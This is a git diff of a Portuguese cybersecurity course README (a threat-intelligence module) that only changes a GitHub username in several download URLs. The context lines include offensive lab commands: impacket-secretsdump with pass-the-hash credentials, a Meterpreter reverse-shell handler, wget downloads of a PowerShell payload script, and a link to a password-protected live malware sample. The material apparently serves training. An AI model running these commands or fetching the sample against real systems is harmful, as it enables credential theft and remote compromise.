@@ -183,7 +183,7 @@ impacket-secretsdump smith@192.168.2.126 -hashes aad3b435b51404eeaad3b435b51404e
 
 Baixando Script que encoda o comando em base64
 ```
-wget https://raw.githubusercontent.com/thiagosmith/pos-cti-adint/refs/heads/main/Modulo03/scripts/encode-command.py
+wget https://raw.githubusercontent.com/smithbraz/pos-cti-adint/refs/heads/main/Modulo03/scripts/encode-command.py
 ```
 
 Editando o script de acordo com o nosso comando:
@@ -299,7 +299,7 @@ msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter
 ``` 
 - Baixando o Script de payload
 ```
-wget https://raw.githubusercontent.com/thiagosmith/pos-cti-adint/refs/heads/main/Modulo03/scripts/payload.ps1
+wget https://raw.githubusercontent.com/smithbraz/pos-cti-adint/refs/heads/main/Modulo03/scripts/payload.ps1
 ```
 - Ajustando o comando no Script "encode-command.py"
 ```
@@ -388,7 +388,7 @@ https://bazaar.abuse.ch/
 
 Ficha de artefato:
 
-https://github.com/thiagosmith/pos-cti-adint/tree/main/Modulo03/Extra
+https://github.com/smithbraz/pos-cti-adint/tree/main/Modulo03/Extra
 
 Recursos Complementares 
 
@@ -546,7 +546,7 @@ https://github.com/SigmaHQ/sigma
 
 Link do Malware para download:
 
-https://github.com/thiagosmith/pos-cti-adint/blob/main/Modulo03/Extra/ComprovanteSantander-senha-password_2.7z
+https://github.com/smithbraz/pos-cti-adint/blob/main/Modulo03/Extra/ComprovanteSantander-senha-password_2.7z
 
 Senha:
 ```
